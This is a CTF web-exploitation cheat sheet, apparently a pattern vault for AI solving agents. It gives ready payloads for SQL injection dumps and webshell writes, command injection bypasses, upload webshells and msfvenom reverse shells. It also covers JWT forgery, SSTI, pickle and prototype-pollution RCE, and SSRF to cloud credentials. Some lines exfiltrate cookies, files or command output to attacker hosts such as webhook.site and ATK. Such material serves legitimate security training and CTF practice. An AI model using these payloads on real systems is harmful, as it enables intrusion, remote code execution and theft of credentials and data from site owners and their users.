---
title: web
type: note
permalink: ctf-vault/web
---

# web patterns

Distilled from the user's CWES notes (battle-tested — passed HTB CWES). Recipe format: signal → technique → command. Grep this on any web challenge.

---

## SQLi — detect
- category: web
- signal: any param in URL/form/login that hits a DB; error or behavior change on `'` or `"`
- technique: break out of the string, observe error/boolean/time diff
- tool/command: append `'` then `"` ; `1' OR '1'='1`-- - ; for login bypass `admin'-- -`
- gotchas: comment styles `-- -` (trailing space), `#`, `/* */`; wrap char may be `'`, `"`, none (numeric), or `')`
- frequency: high
- sources: CWES/SQLi

## SQLi — UNION dump (full chain)
- category: web
- signal: injectable SELECT, results reflected on page
- technique: column count → schema → tables → columns → data via information_schema
- tool/command:
  ```
  ' ORDER BY 5-- -                         # find col count
  ' UNION SELECT 1,2,3,4-- -               # find reflected positions
  ' UNION SELECT 1,2,3,database()-- -
  ' UNION SELECT 1,2,TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES-- -
  ' UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME FROM information_schema.COLUMNS WHERE table_name='Users'-- -
  ' UNION SELECT 1,2,username,password FROM Users-- -
  ```
- gotchas: match column count + a string-compatible position; close char may be `')`
- frequency: high
- sources: CWES/SQLi cheatsheet

## SQLi — privileges, file read, RCE (INTO OUTFILE)
- category: web
- signal: UNION works + possibly privileged DB user
- technique: check privs → read files → write webshell
- tool/command:
  ```
  ' UNION SELECT 1,2,user(),4-- -
  ' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges-- -
  ' UNION SELECT 1,2,variable_value,4 FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
  ' UNION SELECT 1,2,LOAD_FILE("/etc/passwd"),4-- -
  ' UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" INTO OUTFILE '/var/www/html/shell.php'-- -
  # then /shell.php?0=id
  ```
- gotchas: OUTFILE needs FILE priv + EMPTY secure_file_priv + writable webroot
- frequency: med
- sources: CWES/SQLi (chattr)

## SQLi — automate
- category: web
- signal: confirmed/likely SQLi, want speed
- technique: sqlmap
- tool/command: `sqlmap -u 'URL?id=1' --batch --risk=3 --level=5 --dbs` ; POST/JSON `-r req.txt` ; RCE `--os-shell` ; `--file-read`
- frequency: high

---

## XSS-bot + Traefik 2.9 ;-param-injection → control bot URL → exfil flag (picoCTF "msfroggenerator2")
- category: web
- signal: source provided; a **headless puppeteer BOT** visits a URL you submit; flag in `/flag.txt` AND set into the bot's **localStorage**; a reverse proxy with a **PINNED version** (Traefik 2.9, openresty) in docker-compose; a `/report?id=...` endpoint that lua-concatenates your `id` into a `url=` handed to the bot. CSP is strict / front-end has no obvious DOM XSS — the bug is NOT a classic sink.
- STEP 1 (both paths) — **control where the bot navigates.** Proxy builds `url=http://openresty:8080/?id=<your id>`. **Traefik ≥2.7.2 rewrites `;`→`&`** (issue #9164), so `/report?id=;url=<YOUR_URL>` smuggles a 2nd `url=` that wins (bot parses with `Object.fromEntries` → last value wins) → bot goes to YOUR_URL. (`%26` for `&` does NOT work — lua never urldecodes; the `;` rewrite is the trick. Check the proxy VERSION for this CVE — WebSearch "traefik 2.9 CVE".)
- STEP 2 — exfil. **TWO paths — try EASY first:**
  - **EASY / FAST (the intended solve, ~2 requests, no timing):** `url=javascript:fetch('/api/reports/add',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'Bearer '+localStorage.getItem('flag')},body:JSON.stringify({screenshot:localStorage.getItem('flag')})})` — bot runs your JS **same-origin to openresty**, reads `localStorage.flag` (the bot set it), POSTs the flag as the report body. Then read it back as **plaintext**: `GET /api/reports/get`. Use `curl --globoff`.
  - **HARD / SLOW (fallback if `javascript:` blocked) — what our Opus did, 11min:** `url=data:text/html,<payload that downloads a flagger.html>` → `url=file:///root/Downloads/flagger.html` whose `<iframe src=file:///flag.txt>` renders the flag into the bot's **SCREENSHOT**; read the flag from the screenshot image, tuning navigation TIMING to land in the ~5000ms window (watch screenshot BYTE SIZE jump).
- **META-LESSON (this is the speed lever):** there are usually MULTIPLE exfil paths — find the SIMPLEST. For bot challenges, **`javascript:` → read localStorage → POST to a readable endpoint → read-back-as-text** beats `file://`+screenshot every time. Opus over-engineered the hard path; the 2-curl `javascript:` path is the fast intended solve. Ready solver: `templates/web/xss_bot_traefik_exfil.sh`.
- gotchas: bot is on challenge infra → **NO external/ngrok listener** (in-app exfil only). Sonnet-solo + Sonnet+critic FAILED; Opus solved the hard way. The fast win = the `javascript:` exfil.
- frequency: low-med (admin-bot + proxy-version-CVE + in-app exfil tropes in Hard web)
- sources: picoCTF msfroggenerator2 → `CTF{REDACTED}`; writeups Rorical (hard/file://) + graviraj344 (easy/javascript:)

## SQLi — second-order UNION via STORED username, exfil through a report/export (picoCTF "ORDER ORDER")
- category: web
- signal: app brags "prepared queries / parameterized everywhere"; a feature generates a **REPORT / EXPORT / CSV** over your own records. KEY TELL: the **report filename or query embeds your username** (e.g. `report_<username>_<ts>.csv`) → the username is **interpolated** (string-built), not parameterized, into the backend report query like `SELECT description,amount,date FROM expenses WHERE username='{username}'`.
- technique: **second-order UNION injection**. Username is stored safely at registration, then concatenated into the report query later. Register a user whose **username is a UNION payload**, log in, add a dummy row, generate the report, download the CSV — your injected rows come back **in plaintext in the CSV columns** (the CSV is the exfil channel; NO char-by-char extraction). Match the SELECT column count (3 here). Two steps: (1) dump schema, (2) dump the target table.
- tool/command:
  - dump tables: register `username=' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'-- -` → CSV shows all `CREATE TABLE` defs (find the odd/base64-named flag table).
  - dump flag: register `username=' UNION SELECT name,value,3 FROM <that_table>-- -` → CSV row = `flag,CTF{REDACTED},3`.
  - flow each time: register → login → add expense → Generate Report → wait ~10s → download from inbox.
- gotchas: **the "ORDER" name + `?order=`/`?sort=` URL param are a RED HERRING — ORDER BY injection is a DEAD END here.** Don't do boolean ORDER BY char-by-char extraction (too slow, times out the instance). The real vector is **UNION in the report's WHERE clause via the stored username**, and data exfils whole-rows via the CSV. sqlmap misses it (second-order). Match column count; SQLite → `sqlite_master`.
- frequency: med (recurring "prepared statements ≠ safe" + "name in filename = injectable" trope)
- sources: picoCTF ORDER ORDER → `CTF{REDACTED}`; CWES/SQLi

---

## Command Injection — detect + operators
- category: web
- signal: input used in an OS command (ping/host/filename/convert)
- technique: append operator + test cmd (`whoami`/`id`), URL-encode
- tool/command:
  ```
  127.0.0.1; whoami      %3b
  127.0.0.1 && whoami    %26%26   (only if first succeeds)
  || whoami              %7c%7c   (force first to fail: empty IP)
  127.0.0.1 | whoami     %7c      (shows only 2nd output)
  127.0.0.1 & whoami     %26
  $(whoami)  `whoami`             (Linux subshell)
  newline -> %0a (acts as ;)
  ```
- gotchas: `;` fails in Windows CMD (ok in PowerShell); URL-encode in request
- frequency: high
- sources: CWES/Command Injection

## Command Injection — front-end validation bypass
- category: web
- signal: "only IP allowed" error with NO network request (DevTools Network empty) = client-side only
- technique: intercept in Burp, inject directly
- tool/command: Burp → `ip=127.0.0.1%3B%20whoami` → send
- frequency: high

---

## File Upload — absent/weak validation → webshell (top win)
- category: web
- signal: upload form; accepts files; server language known
- technique: upload webshell in server language, visit, run cmds
- tool/command:
  ```
  PHP:  <?php system($_REQUEST['cmd']); ?>     -> /uploads/shell.php?cmd=id   (also exec/shell_exec/passthru)
  ASP:  <% eval request('cmd') %>
  ASPX: <% Response.Write(eval(Request.Item["cmd"])); %>
  JSP:  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
  ```
- gotchas: webshell MUST match server lang (Wappalyzer / URL ext); upload dirs `/uploads /files /images /upload`; `?cmd=find / -name flag.txt 2>/dev/null`
- frequency: high
- sources: CWES/File Upload

## File Upload — bypass filters (ladder)
- category: web
- signal: `.php` blocked
- technique: work the ladder in order
- tool/command:
  ```
  client-side only?  -> Burp: change filename=shell.php + content, Content-Type: image/png
  blacklist?         -> .phtml .php3 .php4 .php5 .phar .pht ; case .pHp .PHP (Windows)
  whitelist regex (no $)? -> double ext shell.jpg.php ; reverse shell.php.jpg (Apache FilesMatch)
  char inject:       shell.php%00.jpg (PHP<5.3.4) ; shell.aspx:.jpg (Windows ADS)
  magic-byte check?  -> prepend GIF89a; or EXIF: exiftool -Comment='<?php system($_GET[0]);?>' img.jpg
  fuzz exts:         Burp Intruder on ext w/ SecLists web-extensions.txt, disable URL-encode
  ```
- gotchas: passing blacklist ≠ executes — server config decides (.phtml/.php5 most likely)
- frequency: high
- sources: CWES/File Upload

## File Upload — reverse shell (prefer)
- category: web
- signal: upload RCE + outbound allowed
- technique: pentestmonkey php-reverse-shell or msfvenom
- tool/command: `msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw > rev.php` ; `nc -lvnp 4444` ; visit file
- gotchas: try revshell first; fallback webshell if outbound blocked / fsockopen disabled
- frequency: high

---

## API — recon + input locations
- category: web
- signal: JSON/XML, `/api/v1/...`, Bearer/JWT, SPA/mobile backend
- technique: map verbs + 3 input spots: path `/users/123`, query `?limit=`, JSON body; read Swagger/`/api/docs`, WSDL (SOAP); test BOLA (enumerate IDs) + excessive data exposure (`jq` hidden fields)
- frequency: med
- sources: CWES/API Attack

## API — OTP / security-question brute (ffuf)
- category: web
- signal: password-reset with OTP / security answer in JSON
- tool/command:
  ```
  ffuf -u URL/api/v1/.../passwords/resets -X POST -H 'Content-Type: application/json' \
    -d '{"Email":"x@y.com","OTP":"FUZZ","NewPassword":"123456"}' -w <(seq -w 0 9999):FUZZ -mr '"SuccessStatus"\s*:\s*true'
  ffuf -u URL/.../security-question-answers -X POST -H 'Content-Type: application/json' \
    -d '{"SupplierEmail":"EMAIL","SecurityQuestionAnswer":"COLOR","NewPassword":"hacked123"}' \
    -w emails.txt:EMAIL -w colors.txt:COLOR -fs 23
  ```
- gotchas: `-mr`/`-fr` regex or `-fs` size; `<(seq -w 0 9999)` for fixed-width OTP
- frequency: med
- sources: CWES/API Attack

## API — JWT
- category: web
- signal: `eyJ...` token
- tool/command: `jwt_tool <t> -M at` ; `jwt_tool <t> -C -d rockyou.txt` ; tamper role claim + re-sign (none/alg-confusion)
- frequency: med

---

## LFI → RCE via PEAR pearcmd
- category: web
- signal: LFI/traversal (`?file=`,`?locale=`) on PHP with PEAR
- tool/command:
  ```
  curl "http://HOST/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system('id')?>+/tmp/payload.php"
  curl "http://HOST/locales/locale.json?locale=../../../../../tmp&namespace=payload"
  ```
- gotchas: also `php://filter/convert.base64-encode/resource=index.php` to leak source
- frequency: low-med
- sources: CWES main

## Crack found hashes
- category: web
- signal: hash from DB dump
- tool/command: crackstation.net ; `hashid <h>` → `hashcat -m <mode> hash rockyou.txt`
- frequency: high


---

# === MINED WRITEUP PATTERNS (auto-generated) ===

# Web Exploitation — CTF Pattern Vault

> Mined from real writeups, deduped, sorted by frequency (high→low, quick wins first). 23 patterns. Recognition-first: observe **signal** → run **tool/command**.

---

## Jinja2/Flask SSTI -> RCE
- category: web
- signal: User input reflected and evaluated; {{7*7}} renders 49 and {{7*'7'}} -> 7777777 (confirms Jinja2 vs Twig). Python/Flask stack, jinja2 in errors, ZeroDivisionError on {{1/0}}. Common in name/greeting/search params, PDF/email templates.
- technique: Confirm with {{7*7}}, then walk Python object graph via globals (lipsum/cycler/self) to os.popen. If _ / os / quotes / brackets blacklisted, use |attr() with hex-escaped names and request.args to smuggle strings.
- tool/command: Detect: {{7*7}}  RCE: {{lipsum.__globals__.os.popen('cat /flag*').read()}}  alt: {{cycler.__init__.__globals__.os.popen('id').read()}}  filter bypass: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}  autopwn: python3 sstimap.py -u 'http://t/?q=*' -e jinja2
- gotchas: subclasses() index drifts between Python versions - enumerate, don't hardcode. {{config}} only leaks SECRET_KEY not RCE. If path/regex filters cmd, base64-pipe: echo <b64>|base64 -d|bash. Sandboxed envs need lipsum/cycler/joiner instead of self.
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md, https://blog.elmosalamy.com/posts/htb-cyber-apocalypse-2025-writeup/, https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

## Non-Jinja SSTI fingerprint + RCE (Twig/Freemarker/ERB/Thymeleaf)
- category: web
- signal: {{7*7}}=49 but Python payloads fail, OR #{7*7}/${7*7}/<%=7*7%> evaluates. Engine-named exception in response (freemarker/Twig/ArithmeticException).
- technique: Fingerprint via which math syntax works and the error class, then use engine-specific RCE gadget.
- tool/command: Polyglot: ${{<%[%'"}}%\  Twig(PHP): {{['id']|filter('system')}}  Freemarker(Java): <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}  ERB(Ruby): <%= `id` %>  Thymeleaf: __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
- gotchas: {{}} not rendering doesn't rule out SSTI - try ${},#{},<%= %>,@{}. Thymeleaf needs __${...}__ wrapper. Freemarker may block ?new (try ?api). Don't assume Python just because {{}} works.
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md, https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/

## SQLi: auth bypass / UNION / error / blind (+sqlmap)
- category: web
- signal: Login or id/search param; single quote -> 500/SQL error; ORDER BY n errors at some n; AND 1=1 vs 1=2 differ; SLEEP causes delay. MySQL/Postgres backend.
- technique: OR-true to bypass auth; find column count (ORDER BY/UNION NULLs), UNION-dump via information_schema; error-based (EXTRACTVALUE/CAST) when errors leak; boolean/time blind otherwise. Crack dumped bcrypt with rockyou.
- tool/command: Auth: ' OR 1=1-- -   Cols: ' ORDER BY 5-- -   Dump: ' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -   Error(MySQL): ' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))-- -   Time: ' AND SLEEP(5)-- - / ' || pg_sleep(5)--   Auto: sqlmap -r req.txt --batch --dump --level=5 --risk=3 --ignore-code 401
- gotchas: Login endpoints return 401/500 -> sqlmap needs --ignore-code 401. Comment: '-- ' (trailing space) MySQL, also #. Postgres uses string_agg not group_concat; cast string cols on type mismatch. WAF: /**/ , case mix, 0xHEX strings. john hash.txt -wordlist=rockyou for $2b$ hashes.
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md, https://book.jorianwoltjer.com/web/server-side/sql-injection, https://forbytten.gitlab.io/blog/htb-cyber-apocalypse-writeups-2024/korp-terminal/

## OS command injection + filter bypass
- category: web
- signal: Field wraps a system tool (ping/nslookup/convert/filename/format param); appending ;id / |id / `id` / $(id) changes output or timing. Output looks like shell output.
- technique: Break out with separator and chain your command. If no output, confirm blind via time delay or OOB DNS/HTTP, then exfil base64. Bypass space/keyword filters with ${IFS}, brace expansion, quote insertion, globbing.
- tool/command: basic: ;id  | 8.8.8.8 && cat /flag*  | blind: ;sleep 5  | OOB: ;curl http://ATK/$(id|base64)  | space filter: cat${IFS}/flag or {cat,/flag}  | keyword filter: c''at /fl''ag or /???/c?t /f??g  | quote-close (TimeKORP): ;'cat /flag*'
- gotchas: Newline %0a often bypasses blacklists blocking ;|&. /bin/sh is dash on Debian - bashisms may fail. Bare $IFS may glue tokens, use ${IFS} or $IFS$9. Filter sees pre-tokenization string only - shell expansions are invisible. sleep confirm must rule out jitter (test 0s vs 5s).
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md, https://mresecurity.com/blog/how-to-bypass-command-injection-and-lfi-filters-brunner-ctf-2025, https://picoctfsolutions.com/posts/command-injection-ctf

## JWT alg:none / weak secret / RS256->HS256 confusion
- category: web
- signal: Cookie/Authorization is 3 base64url dot-separated parts (eyJ...); header decodes to alg HS256/RS256 with a role/user claim. RSA public key fetchable via JWKS/cert/endpoint.
- technique: Try alg:none (keep trailing dot) first. If HS256 brute the secret. If RS256 and you have the public key, sign HS256 using the public key bytes as the HMAC secret (algorithm confusion).
- tool/command: none: jwt_tool <token> -X a   crack: jwt_tool <token> -C -d rockyou.txt  or hashcat -m 16500 jwt.txt rockyou.txt   re-sign: jwt_tool <token> -S hs256 -p 'secret' -I -pc role -pv admin   confusion: jwt_tool <token> -X k -pk public.pem  (get key: openssl s_client -connect host:443 | openssl x509 -pubkey -noout > public.pem)   derive pubkey from 2 tokens: rsa_sign2n/jwt_forgery.py T1 T2
- gotchas: alg:none MUST keep final dot. Try None/NONE/nOnE. Confusion needs EXACT PEM incl trailing newline. kid header may be SQLi/path-traversal injectable; jku/jwk may let you host your own key. python-jwt CVE-2022-39227 mutates one valid token.
- frequency: high
- depth: quick
- sources: https://portswigger.net/web-security/jwt/algorithm-confusion, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md, https://t0rn4d0.medium.com/json-web-token-jwt-ctf-linectf-2024-writeup-part-2-97b3e17d8b7e

## File upload bypass -> webshell RCE
- category: web
- signal: Upload form filtering extension/MIME/magic bytes; uploaded file reachable under a known web path; server runs PHP/Apache.
- technique: Defeat the specific check: alt PHP extensions, double extension, content-type spoof, magic-byte prefix, or drop .htaccess mapping a benign ext to PHP. SVG for stored XSS when only images allowed.
- tool/command: alt ext: shell.phtml / .php5 / .pht / .phar  | double: shell.php.jpg  | magic byte: printf 'GIF89a;\n<?php system($_GET[0]);?>' > s.php.gif  | content-type spoof: Content-Type: image/png on .php  | .htaccess: 'AddType application/x-httpd-php .gif' then upload shell.gif  | trigger: curl 'http://t/uploads/shell.phtml?0=id'
- gotchas: Apache executes any name containing .php on loose configs (shell.php.jpg). .htaccess only Apache + AllowOverride. nginx+PHP-FPM path-info: shell.jpg/x.php. Strip-then-check beaten by shell.pphphp. Must find served path - check Location/fuzz /uploads/.
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md, https://thibaud-robin.fr/articles/bypass-filter-upload/, https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/

## LFI/path traversal -> php://filter source read
- category: web
- signal: Param loads a file (page=/file=/include=/lang=/template=); ../../../etc/passwd leaks passwd lines; .php files return blank (executed not shown).
- technique: Confirm traversal with passwd, then read PHP source by base64-encoding through php://filter so include() returns it as text instead of executing - read index.php/config.php for creds/flags.
- tool/command: passwd: ?page=../../../../etc/passwd   source: ?page=php://filter/convert.base64-encode/resource=config.php  then base64 -d   bypass strip: ....//....// , %252e%252e%252f
- gotchas: If app appends .php, php://filter avoids the extension issue. Null byte %00 only PHP<5.3.4. data:// needs allow_url_include. Base64 output may be truncated - check full response.
- frequency: high
- depth: quick
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md, https://book.jorianwoltjer.com/languages/php, https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06

## Python pickle / insecure deserialization RCE
- category: web
- signal: Cookie/param base64-decodes to pickle opcodes (starts \x80, or gAS/gASV in base64), Flask session, or app calls pickle.loads / yaml.load / jsonpickle on user input.
- technique: Craft object whose __reduce__ returns (os.system,('cmd',)); pickle.dumps, base64, submit in the cookie/param the loader reads.
- tool/command: python3 -c "import pickle,base64,os\nclass R:\n def __reduce__(self): return (os.system,('curl http://ATK/$(id|base64)',))\nprint(base64.urlsafe_b64encode(pickle.dumps(R())).decode())"  | Flask: flask-unsign --sign --cookie "{...}" --secret KEY  | yaml: !!python/object/apply:os.system ['id']
- gotchas: Match encoding (urlsafe vs std b64). Blind -> OOB exfil not stdout. Protocol 2 (\x80\x02) safest/version-tolerant. Java blob = rO0AB/0xACED -> ysoserial; PHP O:NN:"Class" -> POP chain. Flask pickle needs SECRET_KEY (flask-unsign brute).
- frequency: high
- depth: quick
- sources: https://ctf.support/web/python/pickle/, https://davidhamann.de/2020/04/05/exploiting-python-pickle/, https://medium.com/@harryfyx/writeup-uiuctf-2024-push-and-pickle-cf821c49194f

## Stored/Reflected XSS -> admin-bot cookie theft + CSP bypass
- category: web
- signal: Challenge has 'admin bot'/'report to admin'/headless visitor; a field reflects HTML/JS. Flag in admin cookie or admin-only page. CSP header may be present.
- technique: Inject JS that exfils document.cookie (or admin-only page body) to your webhook. If raw script blocked use img onerror/svg onload. Against CSP use location-redirect, allowlisted JSONP gadget, or DOM clobbering + prototype pollution.
- tool/command: <img src=x onerror="fetch('https://webhook.site/UUID/?c='+document.cookie)">  | <svg onload=fetch(`//OOB/${document.cookie}`)>  | CSP-safe: <script>location='http://ATK?c='+document.cookie</script>  | obfuscate: eval(atob('...'))  | listen: webhook.site or php -S 0.0.0.0:8000
- gotchas: HttpOnly cookie unreadable by JS - fetch the admin-only page DOM and exfil that instead. Bot needs a publicly reachable URL (ngrok/webhook.site). CSP unsafe-inline absent -> need allowlisted host gadget or nonce reuse. Encode payload to survive filters (entities/svg).
- frequency: high
- depth: quick
- sources: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies, https://github.com/Mehdi0x90/Web_Hacking/blob/main/CSP%20Bypass.md, https://vicevirus.github.io/posts/wani-ctf-2024-web/

## SSRF -> cloud metadata / gopher internal services
- category: web
- signal: Param takes a URL/host (url=/uri=/image=/webhook=/fetch=/redirect=); PDF/screenshot/image-proxy feature; server fetches it. Response reflects content or differs for internal hosts.
- technique: Point at cloud metadata for creds; gopher:// to speak raw TCP to internal Redis/MySQL/SMTP for RCE; bypass localhost filters with alt IP encodings or DNS rebinding.
- tool/command: AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/   GCP: http://metadata.google.internal/computeMetadata/v1/ (Metadata-Flavor:Google)   bypass: http://2130706433/ , http://[::1]/ , http://0x7f000001/ , http://allowed.com@169.254.169.254 , #allowed.com   gopher Redis RCE: gopher://127.0.0.1:6379/_<URL-enc SET/CONFIG/SAVE cron, CRLF as %0D%0A>
- gotchas: Gopher needs leading underscore after port and %0D%0A CRLFs. New AWS = IMDSv2 (PUT token) - try GCP/Azure or IMDSv1 still works in CTF. parse_url vs curl host-parsing diff enables allowlist bypass. Blind? confirm via Collaborator/oastify OOB. DNS rebind for parse-then-fetch TOCTOU.
- frequency: high
- depth: deep
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md, https://0xdf.gitlab.io/2023/10/28/htb-gofer.html, https://blog.shameerkashif.me/blog/2023/htb-cyber-apocalypse-ctf-2024-web-writeups/

## Client-side cookie/auth decode bypass
- category: web
- signal: Auth state in a base64/JSON cookie or localStorage (role=user, isAdmin, secret_recipe). Not a signed Flask session.
- technique: Decode the cookie client-side; it may contain the flag, or flip a role/flag value and re-set it.
- tool/command: atob(decodeURIComponent(document.cookie.split('=')[1]))   then set isAdmin/role and resend
- gotchas: Signed Flask session (contains a dot + sig) is tamper-evident -> need SECRET_KEY via flask-unsign, not plain edit. Plain base64 = trivially editable.
- frequency: med
- depth: quick
- sources: https://blog.qz.sg/picoctf-2025-web-exploitation-writeups/

## GraphQL introspection -> hidden fields
- category: web
- signal: Endpoint /graphql or /api/graphql; POST {"query":...} returns data/errors JSON; 'did you mean' suggestion error.
- technique: Run introspection to dump the schema, then query the sensitive field (flag/user/secret) directly. If introspection regex-blocked, insert newline after __schema.
- tool/command: probe: {"query":"{__schema{types{name fields{name}}}}"}   bypass: {"query":"query{__schema\n{types{name}}}"}   tools: clairvoyance / InQL Burp ext   then: {"query":"{flags{flag}}"}
- gotchas: POST as application/json. Disabled introspection != no juicy fields - brute names (clairvoyance) or read JS. Mutations may bypass auth. Aliases/batching enable rate-limit/auth bruteforce.
- frequency: med
- depth: quick
- sources: https://book.jorianwoltjer.com/web/server-side/graphql, https://hg8.sh/posts/misc-ctf/graphql-injection/

## Reverse-proxy ACL path bypass (HAProxy/nginx)
- category: web
- signal: Endpoint 403 at proxy but backend route exists; HAProxy/nginx path ACL. (HTB LockTalk CVE-2023-45539).
- technique: Mangle path so proxy and backend parse differently: URL-encode, append #, extra slashes, dot-segments, or ;.
- tool/command: GET /api/v1/get_ticket# HTTP/1.1   also: /api/v1/..%2fget_ticket , %2e%2e%2f , trailing ; or //
- gotchas: # truncates path for proxy but backend still routes (CVE-2023-45539). Different proxies need different tricks. Test both encoded and raw.
- frequency: med
- depth: quick
- sources: https://hackmd.io/@tahaafarooq/HTB-Cyberapocalypse-2024-writeup

## Prototype pollution (Node/Express) -> RCE / auth bypass
- category: web
- signal: JSON body merged/cloned server-side (lodash.merge, deep extend, flat.unflatten, query parse); keys __proto__ / constructor.prototype accepted; unrelated config props change after sending them.
- technique: Pollute Object.prototype to flip an auth flag, change status/behavior, or chain to RCE via a child_process gadget (NODE_OPTIONS/argv0/shell) or template-engine gadget (EJS) that a later sink reads.
- tool/command: detect: {"__proto__":{"polluted":true}} then read it back   auth: {"__proto__":{"isAdmin":true}}   spawn gadget: {"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('id')//"}}}   EJS RCE: {"__proto__":{"client":1,"escapeFunction":"1;return global.process.mainModule.require('child_process').execSync('id')"}}
- gotchas: constructor.prototype variant when __proto__ stripped. flat.unflatten uses dot keys ('__proto__.x'). Pollution is global+persistent -> can DoS the app, test carefully. Gadget must match libs/Node version actually loaded (KTH-LangSec gadget DB).
- frequency: med
- depth: deep
- sources: https://portswigger.net/web-security/prototype-pollution/server-side, https://github.com/KTH-LangSec/server-side-prototype-pollution, https://book.jorianwoltjer.com/languages/javascript/prototype-pollution

## LFI -> RCE via PHP filter chain (no file write)
- category: web
- signal: Confirmed include() of fully controlled path (php://filter base64 source read works), but no upload, no writable log, no data:// wrapper.
- technique: Use convert.iconv filter-chain oracle to make php://filter emit arbitrary PHP into the included stream, achieving RCE with no file write. Generate automatically.
- tool/command: python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'   then: ?page=<generated-chain>&0=id
- gotchas: Payload is huge - may hit URL limits, send via POST. Only triggers code when include()'d, not merely read. Works even with allow_url_include=Off. Verify base64 read first to confirm filters enabled.
- frequency: med
- depth: deep
- sources: https://github.com/synacktiv/php_filter_chain_generator, https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle, https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/

## XXE file read / blind OOB exfil / SVG vector
- category: web
- signal: Endpoint accepts XML/SOAP/SAML/SVG/DOCX/XLSX, or Content-Type application/xml; or a JSON API that also parses XML when you switch content type.
- technique: Define an external SYSTEM entity to read files. If not reflected (blind), host an external DTD that exfils over HTTP via parameter entities; error-based to leak in a parse error. SVG/Office docs reach hidden XML parsers.
- tool/command: inband: <!DOCTYPE r [<!ENTITY x SYSTEM 'file:///flag'>]><r>&x;</r>   OOB e.dtd: <!ENTITY % f SYSTEM 'file:///flag'><!ENTITY % e "<!ENTITY &#x25; ex SYSTEM 'http://ATK/?d=%f;'>">%e;%ex;   payload: <!DOCTYPE r [<!ENTITY % dtd SYSTEM 'http://ATK/e.dtd'>%dtd;]>
- gotchas: Newlines/binary break http:// exfil - wrap target in php://filter/convert.base64-encode. Parameter entities (%) required inside DTD. Modern parsers disable external entities - test blind OOB before assuming patched. Switch JSON->XML content-type on APIs.
- frequency: med
- depth: deep
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md, https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe

## PHP object injection / POP chain (incl. phar)
- category: web
- signal: unserialize() on user input, or filesystem fn (file_exists/fopen/md5_file) on user-controlled path allowing phar://. Source shows classes with __wakeup/__destruct.
- technique: Build a property-oriented (POP) chain through magic methods to a sink (system/file write). No direct unserialize -> smuggle via phar metadata triggered by filesystem ops. Use phpggc for known framework chains.
- tool/command: manual: O:4:"User":1:{s:3:"cmd";s:2:"id";}   phpggc -l ; phpggc Monolog/RCE1 system id   phar: php -d phar.readonly=0 makephar.php then trigger via phar:///path/to/upload.jpg
- gotchas: PHP8.0 disabled phar:// auto-unserialize on FS ops. __wakeup property-check can block (negative-count bypass on old PHP). Private props need \x00Class\x00prop bytes. Check framework first (Laravel/Symfony/Monolog/Guzzle).
- frequency: med
- depth: deep
- sources: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md, https://www.keysight.com/blogs/en/tech/nwvs/2020/07/23/exploiting-php-phar-deserialization-vulnerabilities-part-1

## DOMPurify / mXSS bypass + CSS exfil under CSP
- category: web
- signal: User HTML rendered client-side and sanitized (DOMPurify version in JS bundle), or strict CSP blocks JS but user CSS/HTML reflected. Old DOMPurify <=3.1.x or mutation context.
- technique: Find a version-specific sanitizer bypass (mXSS, namespace confusion, nested SVG/MathML). When JS fully blocked, exfil secrets char-by-char via CSS attribute selectors + @import to attacker host.
- tool/command: check version: grep VERSION purify.js   mXSS: <svg></p><style><a id="</style><img src=x onerror=alert(document.domain)>">   nesting: <math><mtext><table><mglyph><style><img src=x onerror=...>   CSS leak per char: input[value^="a"]{background:url(//ATK/a)}
- gotchas: Bypass tied to exact library version - look up CVE/changelog, don't guess. CSS leak needs per-char selectors + load oracle (font/img). Prototype-polluting DOMPurify config (ALLOWED_ATTR via __proto__) re-enables dangerous attrs. 。 normalizes to dot to dodge domain filters.
- frequency: med
- depth: deep
